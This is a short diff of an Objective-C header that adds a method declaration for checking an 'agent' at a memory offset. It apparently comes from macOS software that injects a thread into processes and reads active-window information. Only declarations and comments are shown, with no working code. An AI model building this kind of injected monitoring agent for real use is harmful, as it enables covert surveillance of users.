@@ -48,6 +48,14 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid);
 // @author
 //  revenge
 // @abstract
+//  Check agent at given offset for start/stop/configuration
+//
++ (void)checkAgentAtOffset: (uint32_t)offset;
+
+//
+// @author
+//  revenge
+// @abstract
 //  This function will just spawn the main injected thread
 //
 + (void)startThreadCommunicator: (NSNotification *)_notification;
